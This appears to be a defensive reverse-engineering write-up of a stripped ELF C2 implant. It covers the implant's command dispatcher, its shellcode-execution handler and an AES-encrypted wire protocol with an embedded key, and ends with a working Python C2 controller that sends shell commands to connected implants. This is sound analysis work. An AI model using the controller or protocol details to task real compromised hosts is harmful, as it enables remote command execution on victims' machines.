Dissecting the 'dark_node' Implant: Reverse Engineering Stripped ELF C2 Wire Protocols with Ghidra

📅 May 15, 2025 ⏱ 15 min read
#reverse-engineering #ghidra #c2-framework #assembly #wireshark

During targeted intrusions, threat actors frequently deploy proprietary, in-house Command-and-Control (C2) implants rather than commercial tools like Cobalt Strike or Metasploit. Because these tools lack public documentation, defenders must reverse engineer the binary from the ground up: locating the main dispatch loop, reconstructing data structures, and reversing the proprietary cryptographic framing.

In this post, we analyze a stripped, 64-bit ELF adversary implant (dubbed dark_node). We will decompile its internal routines using Ghidra, map its command-and-control state machine, recover its custom AES-CBC wire protocol, and write a Python server emulator to interact with the implant.

Analysis Objective: Understand the capabilities of the implant, recover supported tasking commands, decrypt intercepted PCAP traffic, and build an emulation script for threat simulation and sinkholing.

1. Stripped Binary Triage & Locating Main

When analyzing a stripped binary, symbols, function names, and variable labels have been removed by the compiler (strip -s):

file dark_node
# Output: dark_node: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped

checksec --file=dark_node
# Output:
#   RELRO:    Full RELRO
#   Stack:    Canary found
#   NX:       NX enabled
#   PIE:      PIE enabled

To find the true entrypoint and original main() function in Ghidra, we examine the ELF _start function. In standard x86-64 glibc binaries, _start passes main as the first argument (in register RDI) to __libc_start_main:

; Standard _start disassembly in Ghidra
_start:
    xor     ebp, ebp
    mov     r9, rdx             ; rtld_fini
    pop     rsi                 ; argc
    mov     rdx, rsp            ; argv
    and     rsp, 0xfffffffffffffff0
    push    rax
    push    rsp
    lea     r8, [__libc_csu_fini]
    lea     rcx, [__libc_csu_init]
    lea     rdi, [FUN_00101b40]  ; <-- TRUE main() function pointer!
    call    __libc_start_main
    hlt

Navigating to FUN_00101b40 brings us directly into the primary agent initialization routine.

2. Reconstructing the Agent Context Structure

Inside main, Ghidra decompiles several references to a dynamically allocated 64-byte heap chunk (malloc(0x40)). The program initializes various fields: socket descriptors, sleep timers, and cryptographic keys.

By tracking offsets, we define a custom C struct in Ghidra's Data Type Manager:

// Recovered agent context structure
struct AgentContext {
    int   sock_fd;              // offset +0x00
    int   sleep_interval;       // offset +0x04 (in seconds)
    int   jitter_pct;           // offset +0x08
    int   agent_id;             // offset +0x0C
    char  c2_host[32];          // offset +0x10
    uint16_t c2_port;           // offset +0x30
    uint8_t aes_session_key[16];// offset +0x32
    uint8_t is_authenticated;   // offset +0x42
};

Once applied to Ghidra's decompiler view, opaque pointer math like *(int *)(ptr + 0x0c) = rand(); turns into readable code: ctx->agent_id = rand();.

3. Mapping the Command Dispatch Table

Following the connection loop, the agent enters an infinite loop waiting for incoming packets from the C2 server. When a valid packet arrives, it extracts an opcode integer and enters a dispatch mechanism:

// Decompiled command dispatcher in FUN_00102120
void dispatch_command(struct AgentContext *ctx, uint16_t opcode, uint8_t *payload, uint32_t len) {
    switch (opcode) {
        case 0x1001: // Heartbeat Ping
            send_pong_response(ctx);
            break;
            
        case 0x1002: // Update configuration
            update_beacon_interval(ctx, payload, len);
            break;
            
        case 0x2001: // Execute shell command via popen
            execute_system_command(ctx, (char *)payload);
            break;
            
        case 0x3001: // Read file and upload to C2
            upload_file_to_c2(ctx, (char *)payload);
            break;
            
        case 0x3002: // Write incoming stream to local file
            download_file_from_c2(ctx, payload, len);
            break;
            
        case 0x4001: // Execute raw shellcode in memory
            inject_memory_shellcode(ctx, payload, len);
            break;
            
        case 0x9999: // Self-delete & kill agent
            unlink_and_terminate(ctx);
            break;
            
        default:
            log_error("Unknown command opcode: 0x%04x\n", opcode);
            break;
    }
}

Command 0x4001 is especially critical: inspecting inject_memory_shellcode reveals that it uses mmap with PROT_READ | PROT_WRITE | PROT_EXEC, copies the incoming network payload into memory, and jumps directly to it using a function pointer call (((void(*)())buf)();). This confirms the implant is an interactive staging agent capable of arbitrary in-memory code execution.

4. Wire Protocol Framing & Cryptography

Next, we analyze how the agent packages outbound responses and parses incoming taskings. Looking inside send_encrypted_packet, we discover a strictly structured binary protocol header:

OffsetFieldSizeDescription
0x00 - 0x03Magic Header4 bytesStatic constant: \x7f\x44\x4e\x32 ("\x7fDN2")
0x04 - 0x07Agent ID4 bytesRandom uint32 identifier (Little Endian)
0x08 - 0x09Opcode2 bytesAction identifier (e.g., 0x2001)
0x0A - 0x0DPayload Length4 bytesLength of the encrypted payload following the IV
0x0E - 0x1DInitialization Vector16 bytesRandom IV generated per-packet via /dev/urandom
0x1E - EndEncrypted BodyN bytesAES-128-CBC encrypted payload with PKCS#7 padding

Recovering the AES Encryption Key

Decompiling the handshake function (FUN_00101890), we see how the session key is established. Before receiving dynamic tasking, the implant verifies the server using a pre-shared 16-byte key embedded directly in the .rodata section:

; Key loading in Ghidra disassembly
lea     rsi, [DAT_00104080]    ; Pointer to raw 16-byte key: "k9#V!mP7$zQ2@wE1"
mov     rdi, [rbp - 0x18]      ; Pointer to context struct
call    initialize_aes_context

With this hardcoded key and the packet structure fully documented, we can decrypt any intercepted network captures and emulate the server without running the original adversary infrastructure.

6. Building an Offline Python C2 Protocol Emulator

We can now construct a lightweight Python server capable of speaking the proprietary protocol. This allows incident responders to safely interact with quarantined implants or sinkhole rogue agents in an isolated network segment:

#!/usr/bin/env python3
"""
DarkNode C2 Protocol Handler & Interactive Controller
Reverse-engineered from binary dark_node (ELF 64-bit)
"""
import socket
import struct
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad

MAGIC_HEADER = b"\x7fDN2"
MASTER_KEY   = b"k9#V!mP7$zQ2@wE1" # Extracted from .rodata

def decrypt_packet(raw_data):
    if len(raw_data) < 30 or raw_data[:4] != MAGIC_HEADER:
        return None
    agent_id, opcode, payload_len = struct.unpack("<IH I", raw_data[4:14])
    iv = raw_data[14:30]
    ciphertext = raw_data[30:30 + payload_len]
    
    cipher = AES.new(MASTER_KEY, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return {"agent_id": agent_id, "opcode": hex(opcode), "body": plaintext}

def craft_packet(agent_id, opcode, payload_bytes):
    iv = os.urandom(16)
    cipher = AES.new(MASTER_KEY, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(payload_bytes, AES.block_size))
    
    header = MAGIC_HEADER + struct.pack("<IH I", agent_id, opcode, len(ciphertext)) + iv
    return header + ciphertext

def start_emulator(host="0.0.0.0", port=9001):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(5)
    print(f"[*] DarkNode C2 Sinkhole listening on {host}:{port}...")

    conn, addr = srv.accept()
    print(f"[+] Implant connected from {addr[0]}:{addr[1]}")
    
    # Receive initial beacon
    data = conn.recv(4096)
    pkt = decrypt_packet(data)
    print(f"[+] Initial Beacon Received: Agent ID={pkt['agent_id']}, Opcode={pkt['opcode']}")

    # Send interactive command: whoami (Opcode 0x2001)
    print("[*] Sending tasking: 'id && uname -a' (Opcode 0x2001)...")
    task_pkt = craft_packet(pkt['agent_id'], 0x2001, b"id && uname -a")
    conn.sendall(task_pkt)

    # Receive command output
    resp = conn.recv(4096)
    result = decrypt_packet(resp)
    print(f"\n[+] Implant Response:\n{result['body'].decode('utf-8', errors='replace')}")

    conn.close()

if __name__ == "__main__":
    start_emulator()

Conclusion

Reverse engineering custom adversary tooling provides defenders with unique tactical advantages. By extracting memory structs, breaking proprietary network protocols, and recovering embedded cryptographic keys, you transform an unknown black-box threat into a completely transparent, actionable intelligence artifact.

Remember: stripped symbols and missing source code are only temporary hurdles. Methodical disassembly, struct alignment, and dynamic verification will unlock even the most guarded custom toolkits. 🛠️
